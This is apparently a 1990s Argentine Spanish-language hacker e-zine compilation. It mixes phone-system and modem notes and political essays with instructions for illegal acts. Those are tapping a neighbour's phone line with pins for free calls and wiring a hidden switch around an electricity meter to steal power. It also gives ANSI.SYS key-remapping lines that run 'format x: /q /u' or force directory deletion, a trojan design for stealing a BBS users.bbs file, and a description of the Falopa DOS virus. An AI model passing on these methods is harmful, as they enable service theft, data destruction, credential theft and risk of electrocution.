En el Caller-ID se almacena en una memoria volatil, y si en caso de que se
tenga algun fossil o bbs instalado, los datos los guarda en el log.
Por una pantallita digital muestra el telefono del que llama.
La conexion es con los 2 cables del telefono.

02 28 12:45 802557
³  ³   ³    ³
³  ³   ³    +ÄÄÄÄÄÄÄÄÄ Numero del Telefono del que llama
³  ³   +ÄÄÄÄÄÄÄÄÄÄÄÄÄÄ La hora y min
³  +ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ El numero de dia del presente mes
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ El numero de mes del presente a¤o

La norma que se usara sera la europea, no la americana.
El CID se usa con portadora de modem europea CCITT v.23
En caso de usar un modem con la Bell 202 tenes que tratar de ver si
lo podes configurar para que sirva, hay modelos que sirven para ambas.

Para bloquear se pone *31#telefono
Tambien es posible ocultar la identificacion llamando a la operadora y
pedirle que no pase informacion al caller-id del destinatario.



El quinto centenario
no hay nada que festejar
latinoamericano descorazonado,
hijo bastardo de colonias asesinas
cinco siglos en sus parafiestas
celebrando la MATANZA DEL INDIGENA

! NO HAY NADA QUE FESTEJAR !

                  V Centenario (Los Fabulosos Cadillacs)

Si, estamos todos felices, no se labura, no se estudia, hoy es como un
domingo mas.
Pero viejo, estamos festejando la muerte de aquellos indigenas que fueron
asesinados por el solo hecho de haber llegado a America antes que los
europeos.
- Y que, a nosotros nos chupa un huevo, si fue hace mas de 500 a¤os.
- Claro, en el 2582 nuestros tataratataratatara...nietos van a festejar el
asesinato de un toco de pendejos que fueron a defender Malvinas, y van a
estar festejando tal vez en Rosario, Cordoba, Bs.As.
Eso no les gustaria, pero para peor, nos lo estan metiendo desde chico que
fue el bien el que derroto al mal, siendo los europeos el bien y los
indigenas americanos el mal.
- Bueno, ma¤ana vamos a FESTEJAR el dia de la raza asi que vengan sin
cuadernos, entendieron chicos ?
- SI, SE¥ORITA !!!
Asi nos chantajeaban, o con alguna de esas revistas educativas que nos dice
desde cuando a Colon se le metio en la cabeza que la tierra era redonda
hasta que llegaron aca, le dieron a los pobres indigenas alimentos dulces,
espejitos, a cambio de una simple piedra, ORO, que buenas personas eran
esos europeos.
Y al final, las salvajes tribus se revelaron sin motivo alguno que valga
la pena (violaciones por parte de los soldados europeos a las indigenas,
matar sin motivo alguno, etc) y tuvieron que eliminar a las tribus para
protegerse.
La paradoja de esto es que no hay que creer en lo que nos meten desde la
cuna, seamos sensatos y dejemos de festejar una fecha y una historia
inventada, porque lo que hizo Hitler es muy parecido a lo que hicieron hace
500 a¤os europeos, que eran asesinos invasores, y no simples colonizadores.



Ayer, Hoy, Ma¤ana, el virus Falopa.
Al correr un exe infectado, desinstala el vsafe, se fija la fecha del sistema,
tambien se fija si el Falopa ya esta activo en memoria, si lo esta no hace
nada, y si no lo esta, copia el virus a la memoria.
Una vez que se copia a la memoria, al ejecutar un exe trata de infectarlo.
Se fija por la marca MZ si es un EXE, si lo es, verifica la firma del virus,
y si no tiene la firma del Falopa en el Header, entonces quiere decir que
el archivo exe no esta infectado, mientras que si la tiene, no infecta y
deja el archivo tal y como el programador lo trajo al mundo.
En caso que la firma no sea la del Falopa, cambia el principio del exe,
copia su firma y crea un salto al codigo del virus que copia al final del
archivo infectado.
Cambia los atributos del archivo, de +R lo deja a A, o si el archivo
infectado es corrido varias veces lo deja simplemente en nada.
Tambien cambia la fecha y hora (del archivo gilllllllll).
No usa tecnicas de polimorfismo ni stealth, y despues de infectar, borra
el archivo chklist.ms, que es el verificador del ms-dos 6.0, como se
daran cuenta, es bastante caduco, porque utiliza tecnicas contra los
antivirus del ms-dos 6 (vsafe y msav).
En caso de que el dia del sistema sea 25 de diciembre (12/25/....) muestra
su mensaje que dice:
" No se metan en el
  camino de la droga
  que somos muchos
  y hay poca.
  Falopa Virus Parana"



Pinchar es una cosa facil, pero es recomendable tener maxima seguridad de no
ser vistos por gente de la ley (milicos malparidos) o vecinas chismosas.
Tambien es conveniente asegurarse que el perro del vecino no empieze a ladrar
cuando nos vea haciendo vandalismo.
Compra o pedile a tu vieja/abuela/hermana/novia dos alfileres.
Comprate en cualquier negocio de electronica un led de color rojo, no vale mas
de 10 centavos.
Busca un cable, preferiblemente de color negro u oscuro.
El cable original de Telecom adentro de la cobertura plastica se divide en
dos, Cable A y Cable B.


================================================
///Cobertura - - - - - - - - - - - - - - - ---------------- Cable A (+)
///del cable
///Original  - - - - - - - - - - - - - - - ---------------- Cable B (-)
================================================


Conecta un cable con el Alfiler 1 y el otro con el Alfiler 2.
Pinchar el Cable A con el Alfiler 1.
   "    el Cable B con el Alfiler 2.
La salida, va a la caja del telefono nuestro.

 Alfiler 1                                             ++++++++++
   o----------------------Salida cable a Caja----------+  Caja  ++
   ³        Alfiler 2                                  +   de   ++----+
   ³          o-----------Salida cable a Caja----------+  Tel.  ++    |
=====Cable A  ³                                        ++++++++++     |
              ³                                                       |
================Cable B                                            Telefono

Levantamos el tubo y nos da tono. que hacemos?
Esperar a que sea de noche. A eso de las 2 am.
Levantamos el tubo y tipeamos 121. El telefono nuestro tiene que estar en tone.
Lo que hace es leer automaticamente el numero desde donde llamas, y te
dice la cantidad de pulsos que gastaste, o en este caso gasto.



Lo que paso a explicar ahora es como colgarse de la lu' que es una pelotudes
tambien, pero a la gente no se le ocurre muy segido. Lo que tenes que hacer, es
hacerle un puente al medidor y ponerle un switch, porque si un mes te vienen
50 mangos y al otro 5 monedas, es obvio que los de la epe se avivan.

La cosa viene + o - asi:

                                º  ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ v Entrada
                            ÚÄÄÄ×ÄÄ´ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ n (220 v)
                            ³   ºÚÄÁÁÄ¿
                            ³   º³    ³
                      S     ³   º³ M  º <= Ventilador (Gira a 2000 RPM) :)
                      w     ³   º³ e  ³
                      i   \     º³ d  ³      v = Vivo
                      t    \    º³ i  ³      n = Neutro
                      c     ³   º³ d  ³
                      h     ³   º³ o  ³      º = La pared de la house.
                            ³   º³ r  ³
                            ³   º³    ³
                            ³   ºÀÂÄÂÄÙ
                            ÀÄÄÄ×Ä´ ³
                                º ³ ³
      Salida  v ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ×ÄÙ ³
      (220 v) n ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ×ÄÄÄÙ
                                º

Este grafico intenta aclarar que NO se deseconecta el medidor, se le hace un
puente. El puente se debe hacer en el VIVO, si no sabes cual es cual,
comprobalo con un buscapolos o de ultima toca los dos, y el que mas te cague a
patadas es el vivo :) . La conexion debe quedar OCULTA, porque sino los putos
de la epe te meten en cana.
Cuando pongan un lavarropas, una plancha, un cuarzo, o algo groso en
consumo, accionen el switch y la corriente va a ser free. El switch tiene que
ser grossso, no pongan culaquier boludez. Busquen uno SEGURO, 220 v 20-25
amperes. Tengan en cuenta, que cuando conecten el puente, si se cagan
electrocutando no va a haber disyuntor, termomagnetica ni tapon que salven sus
vidas...Guarda....

Origin: El que roba a un ladron tiene cien a¤os de perdon.



Veamos, la cosa es mas o menos asi:

      [97;"format x: /q /u";13p
      ³ ³   ÀÄÄÄÄÄÄÂÄÄÄÄÄÄÙ   ³
      ³ ³          ³          ³
      ³ ³          ³          ÀÄÄÄÄÄ=ð> Para que apriete <Enter>
      ³ ³          ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ=ð> La orden, el corazon de la linea ;)
      ³ ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ=ð> El codigo ANSI, en este caso la 'a'
      ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ=ð> La flecha para la izquierda (ESC)


Supongamos que esta linea pertenece al ansi.ans, si lo ejecutamos, es decir
que en la linea de comandos ponemos: X:\>type ansi.ans cuando la victima
apriete la letra 'a' el ansi.sys lo reemplazara por lo que este entre las
"comillas", pero que ocurre: si el tipo pone en la linea de comando:
X:\>La, quedara asi: X:\>Lformat x: /q /u y la maquina trola va a decir el
famoso 'Comando o nombre de archivo incorrecto'. Este problema es solucionable
basta con agregarle el '|' despues de la primera comilla.
Entonces, por mas que ponga X:\>La, se le va a lavar el HD ;), este es uno de
los tantos metodos para usarlo, el mas simple.

Ahora, este otro metodo es para borrar un directorio en especial. Este seria
el autoexec:
@Echo off
Bla.
Bla..             ÚEl ji_ji.ans por dentro
Bla...            ³
Type ji_ji.ans <ð=´[110;"s";13p
del x:\lb         ³
                  ÀEsto reemplaza la 'n' por 's <Enter>'


Supongamos que en el dir lb tiene algo grosso y se lo queremos hacer pelota.
Despues de agregar esto en el autoexec.bat, al rebotear la PC, el DOS le va
a preguntar: ¨Esta seguro (s/n)?, porque pide confirmacion al borrar
directorios entonces el novato va a poner 'n' y el ansi lo reemplaza por 's' y
le cagamos el directorio.
Podes agregar en el autoexec.bat format x: /q /u, pero no tiene gracia, no
usas el ANSI y ademas cuando el user pone n y de todas manera borra todo, se
siente culpable. ;)

Es obvio que para usar los ANSI tenes que tener en el config.sys una linea
que diga mas o menos esto:

DEVICE=X:\DOS\ANSI.SYS

Para que el ansi funke bien.



RA 2.xx
-------
El archivo que tiene todos los datos de los usuarios es el users.bbs, que
por defecto se encuentra en el path c:\ra.
Pero si el sysop le cambio el path, se agrega un punto para el troyano; buscar
el archivo por el rigido.
Muchos sysop tienen el path del users.bbs como c:\...\ra\msg.
Agarras y haces un programa que parezca util, pero que sea al fin y al cabo
troyano, lo subis al bbs, y cuando el sysop lo ejecuta en su maquina trabaja
silenciosamente.
Un programa que antes de instalarlo busca aplicaciones para el mismo.
Y mientras hace busqueda de directorios busca el users.bbs.
Al final, podes poner que falta un archivo o falla la placa de rigido.
Viste esas areas inexploradas por todos los usuarios ?
Esas llenas de archivos que no baja nadie ?
Esos que tienen descripciones muy malas, como por ejemplo en area uploads
esos archivos con descripciones como asdfg, subidas para aumentar el ratio.
O algunas imagenes jpg, que muchas como no tienen descripciones no se sabe si
estan o no buenas, esas 7bygre45.jpg, aunque las pornos generalmente estan en
cd.
El troyano entonces busca el archivo ese poco bajado, guarda el path en
variables o registros.
Despues que busque el users.bbs, y entonces lo que tiene que hacer el trojan
es copiar (ojos con los atributos) el users.bbs en el directorio guardado
donde estaba el file predeterminado, pero no copiarlo con el nombre users.bbs,
sino con el nombre del archivo ese (7bygre45.jpg).



Encriptar es codificar datos es una especie de codigo entre el que envia
datos hacia el que recibe datos.
Un ejemplo, olvidemos las computadoras, los codigos de letras entre YO
y Calcio son estos:
Para la letra A le corresponde la R
Para la G la C
U.....Z
N.....%
T.....H
E.....;
[espacio]...S
M.....*
L.....Q
Solo sabemos estos codigos yo (Jerico) y Calcio (el).
Entonces le envio (en un papel, una computadora, etc) este mensaje:
"RCZR%H;S*Q"
El lo recibe, y usando los codigos de caracteres de nosotros dos entiende
el mensaje:
"AGUANTE ML"
Esto es usado para que ningun tercero pueda comprender el mensaje que yo
le envie a Calcio, y entonces, se tiene privacidad de lo que le digo.
No es de ahora, epoca de PCs, es de mucho tiempo antes.
En las computadoras es pura matematica.
Un claro ejemplo de codificacion es el archivo CRIPT.PAS (de LB2).
Ejemplo, un programa que lee un archivo caracter por caracter, lo
pasa a su equivalente numerico de la tabla ascii, y a este numero le
suma 42 (numero elegido por mi debido a gusto y a parentezco con la
encriptacion Password: *****)
Despues lo graba.
Lee "AGUANTE ML"
La FORMULA es: NumCaractAscii + 42 = X

Como queda el archivo finalizado ?
kqkx~oJwv

Otro programa desencripta los archivos encriptados con el programa anterior.
Lo que hace es pasar el caracter al numero ascii, le resta 42 y el resultado
lo vuelve a pasar a caracter.
Entonces, crea un nuevo archivo dejandolo asi por dentro:
AGUANTE ML



Entre dos clientes, Diego y Armando hay muchos artefactos que intermedian.
Diego quiere llamar por telefono a Armando, que vive en la misma ciudad,
pero a muchas cuadras de distancia.
Al levantar el tubo, por la linea de telefono (que en ese momento estaba
en 48v) pasan 10v. La central origen espera que el origen, Diego, marque
en su telefono el numero de Armando, destino. Diego puede marcar por tono o
por pulso. Si tiene el viejo telefono a disco, entonces solo puede llamar
por pulso, y si tiene el de tono, puede marcar por tono o por pulso, segun
el telefono este seteado (SISISI!!!, esa palanquita atras, al lado del
volumen).
Cada teklita del telephono al apretarla manda 2 frecuencias, las clasicas
denominadas DTMF (Dual Tone Multi Frequency).
La tabla DTMF

     HZ  1209 1336 1477 1633
     697   1    2    3    A
     770   4    5    6    B
     852   7    8    9    C
     941   *    0    #    D

Entre centrales hay determinados tipos de se¤alizacion.
Entre centrales de Argentina se usa CCITT7 o SS#7. [por tal motivo me olvide
de la blue box].
Entre centrales de Argentina y Chile se usa la ccitt5, por lo cual se puede
hacer blue boxing ;)
Otra tablita, la de ccitt5, gentileza de Cut and Past
700   :   1   :   2   :   4   :   7   :  11   :
900   :       :   3   :   5   :   8   :  12   :
1100  :       :       :   6   :   9   :  KP   :
1300  :       :       :       :  10   :  KP2  :
1500  :       :       :       :       :  ST   :
      :  900  : 1100  : 1300  :  1500 : 1700  :

Entre centrales extranjeras se usa la ccitt5.

Rapidamente la informacion (datos procesados) llega a la central destino, esta
la convierte para que el telefono de Armando la pueda interpretar y el
telefono de Armando suena (RING!!!!).
Armando levanta el tubo, pregunta quien es el que esta del otro lado y
empieza a hablar con Diego. [cuando paso a buscar el papelito?]
Despues Armando corta, pero hasta que Diego, o sea, origen, no corte, la
comunicacion no ha terminado.
Hay algunas centrales en las que la comunicacion se termina cuando cualquiera
de los dos corta (0800).



Modem
=====
Es un Modulador/Demodulador.
Se conecta a un telefono y se logra la comunicacion entre computadoras.

Coneccion
=========
Sacar el gabinete y colocar la plaqueta en un puerto vacio.
Tienen que saber setear el puerto com y las irq's.
+-----+--------+            +-----+--------+
| com | switch |            | irq | switch |
+=====+========+            +=====+========+
|  1  |  5,6   |            |  2  |   7    |
|  2  |   6    |            |  3  |   4    |
|  3  |   5    |            |  4  |   3    |
|  4  |  nada  |            |  5  |   2    |
+-----+--------+            |  7  |   1    |
                            +-----+--------+

Instalacion de software
=======================
Lo primero que hay que hacer es instalar el software.
* Para DOS:
Configurar el programa de comunicaciones para el com seteado anteriormente.
Elegir COM y elegir IRQ, los BPS, Book Record con los telefonos de los
bbs, y todos esos datos.
Listo, ahora llamar.

* Para Windows:
Correr Windows.
Despues, elijan el grupo de programas Principal, Panel de control y
elijan Puertos. Configurar el com. Los baudios, paridad, avanzadas, y
dentro de avanzadas la irq.
Salir de todo.
Salir de Windows.
Volver a entrar a Windows.
Y ahora, verificar que el software de comunicaciones este bien configurado.
Si lo esta, al siguente paso, llamar.

Llamar
======
Es la hora de llamar, ATPDnumero o ATDTnumero
ejemplo
ATDP802557<enter> o ATDT802557<enter>
Esperamos, y si conectamos, primero seremos aturdidos con sonidos molestos,
y despues nos va a mandar este mensaje:
CONNECT 14400 o CONNECT 28800
Si no nos podemos comunicar puede poner:
NO BUSY o NO CARRIER o NO DIALTONE.
Puede ser que este mal conectado el modem con el telefono, o que el numero
al que llamamos no haya ningun bbs o que no tenemos telefono, etc.



El CALL es un 'servicio' de mierda que cuando no estas te
responde las llamadas (contestador automatico), suponete que te dan el
servicio:
1) Llamas a la casa de alguien.
2) No hay nadie.
3) Atiende el CALL [Empieza a chupar pulsos]
4) Hola, habla Carlitos, te llamaba para avisarte de que tu hermana esta aca
conmigo y esta todo bien.
5) El sujeto que tiene el call, llega a la casa de su amigo, llama al 600123
para ver si tiene nuevos mensajes. [Telco te empieza a cobrar]
6) Se entera de que lo llamo CarlosD, acto seguido, cuando vuelve a su casa,
llama a la casa de Carlitos y lo putea. [Chupa pulsos otra vez]

Si presta atencion al texto anterior se daran cuenta que telecomepulsos gana
guita TRES veces, en los puntos 3, 5 y 6, en cambio si no tuvieran el CALL
seria todo como antes y telegarcha ganaria en solo 1 punto, que es lo normal.
Otro, el plustel, ocurre que Telemoco no se quiere perder ni una llamada,
entonces sacaron el plustel, si vos estas hablando por telefono y te llama
un tipo te suena un pitito y con el '1' hablas con un tipo y con el '2' con
el otro. De esta manera, la empresa en cuestion no se pierde ninguna llamada,
encima mientras vos dejas esperando a un tipo en una linea, aunque no hablen
los pulsos siguen lloviendo. Ademas, te cobran 2-3 pesos por el servicio.
Con respecto a la tarjeta esa de mierda para llevar tu linea a donde vayas,
encima de cobrarte DIEZ mangos por el 'servicio' te sacan guita tambien por
la cantidad de llamadas, (ej. si haces 20 llamadas te cobran 1.21 de recargo).
Sobre los 0609 mejor ni hablar.













































































































U.S.A.: el gendarme innecesario
por Angel J. Cappelletti
   El derrumbe de la URSS, coloso al parecer petreo pero con pies de barro,
nos dejo un mundo unipolar. A la guerra fria le sucedio la paz tibia.
Usufructuario y gendarme de este universo que por no ser frio ni caliente
provoca vomitos (segun el dicho biblico) son los Estados Unidos de America
del Norte.
   Las contradicciones que hasta 1990 hicieron peligrar la paz internacional
no eran sin duda, como se pretendia, las que mediaban entre capitalismo y
socialismo, sino que surgian del afan de dominacion por parte de dos
poderosos Estados. En todo caso, eran las contradicciones entre el
capitalismo de las transnacionales y el capitalismo tecno-burocratico. Cuando
la primera de ambas formas capitalistas demostro ser mas eficiente
economicamente que la otra, Estados Unidos, centro principal y prototipo de
esa modalidad de la explotacion del trabajo, surgio como unica cabeza, por el
hecho de ser ademas el pais mas rico y el mejor armado.
   En 1990 se vivio el sueño de la "pax americana". Pero no pasaron muchos
meses sin que un sanguinario dictador, Saddam Hussein, desafiara la hegemonia
mundial de los Estados Unidos, atacando a un vasallo fiel, el Emirato de
Kuwait. El papel de gendarme internacional fue asumido sin mayores
vacilaciones por la potencia imperial. Despues fue Somalia, como poco antes
Panama y Granada. Hoy es Haiti y, tal vez, de nuevo Irak. Ma¤ana puede ser
Cuba o, por que no, el socio y vecino Mexico. Estas invasiones militares se
caracterizan por ciertos rasgos que las diferencian de otras muchas que
llevaron a cabo en el pasado los yanquis. En 1er. lugar, apenas provocan
reacciones adversas en la opinion publica internacional y cuentan con la
opinion publica nacional (que ya no recuerda Vietnam). En 2do. lugar, la
accion yanqui se presenta  hipocritamente, como "intervencion internacional";
se invoca la cooperacion de "aliados" y la ayuda simbolica de "amigos" que no
son sino vasallos. En 3er. lugar, las operaciones militares se llevan a cabo
contra gobiernos dictatoriales y sanguinarios, pero no porque ellos lo sean
sino simple y llanamente porque perjudican los intereses o amenazan de algun
modo el prestigio mundial del gran gendarme.
   El ultimo rasgo es tal vez el mas interesante. En el mundo de hoy, una vez
desaparecido el contrapeso de la Union Sovietica, nadie puede rebelarse
contra el orden imperial y la hegemonia norteamericana sino desde la
izquierda radical (una izquierda que vaya mucho mas alla del marxismo-
leninismo) o desde una derecha fascistoide (que esgrima consignas ultra
nacionalistas). La primera posibilidad, unica valedera y autentica, no se ha
dado todavia y quiza no se de en muchos a¤os. La segunda es la que
encontramos en Irak, en Somalia, en Haiti (y antes en Panama). Esto, desde
luego, favorece mucho la imagen de "defensor de la democracia" que el
gendarme desea proyectar. Basta, sin embargo, tener en cuenta los
antecedentes de las dictaduras que el imperio ataca, para entender la
responsabilidad del mismo en la instauracion de esas dictaduras: Noriega fue
colaborador, confidente y espia de la CIA. Hussein fue apoyado por el State
Departament como amigo confiable contra los ayatolas de Iran. A Cedras se le
aseguro exilio dorado, se le devolvieron millones depositados en bancos
norteamericanos y casi se le considera merecedor del Premio Nobel de la Paz;
Carter, con su habitual boberia, asegura que no es un maton sino una persona
decente. Mientras tanto, miles de haitianos que huian del dictador y de los
"tontons macoutes" (reliquias gloriosas del duvalierismo, que USA nunca
cuestiono seriamente) eran devueltos a su pais (a riesgo de ser asesinados
por militares o paramilitares) o encerrados en el campo de concentracion de
Guantanamo.
   Todo esto demuestra que al gendarme no le interesan en verdad la
democracia ni los derechos humanos, sino la defensa de sus intereses o, como
en este ultimo caso, la afirmacion de su hegemonia continental y mundial. Es
claro que quienes ocupan hoy la Casa Blanca y quienes dirigen el Pentagono,
la CIA y el Departamento de Estado son fieles discipulos y continuadores de
quienes promovieron en Chile el golpe de Pinochet, quienes apoyaron por de
cadas a Stroessner, quienes sonrieron a Ongania y Videla con complacencia de
hermano mayor y solo se opusieron a los genocidas militares argentinos cuando
un borracho decidio invadir las Malvinas, ambito intocable de hermanos
anglosajones.
   Quienes adversan el fascismo y, consecuentemente, el racismo y el
nacionalismo, no pueden dejarse enga¤ar ni un instante por las proclamadas
intenciones del innecesario gendarme. Comienzan por detestar el
narcopatriotismo de Noriega; la sangrienta ferula de Hussein, exterminador de
kurdos, shiitas y opositores politicos en general; la abominable opresion
del neo duvalierismo de Cedras, pero no se detienen sino hasta dejar claro
que todos estos fenomenos patologicos no se hubieran generado sin complicidad
del "guardian de la democracia y los derechos humanos"; no paran hasta hacer
comprender a todos que, tras las nobles intenciones oficialmente aducidas, no
hay sino una manifestacion, mas o menos refinada, del viejo imperialismo.
Acabar con las dictaduras y poner a salvo los derechos humanos no es tarea
para quienes fueron (y ocultamente siguen siendo) los mejores amigos de los
dictadores y los primeros violadores de los derechos humanos.
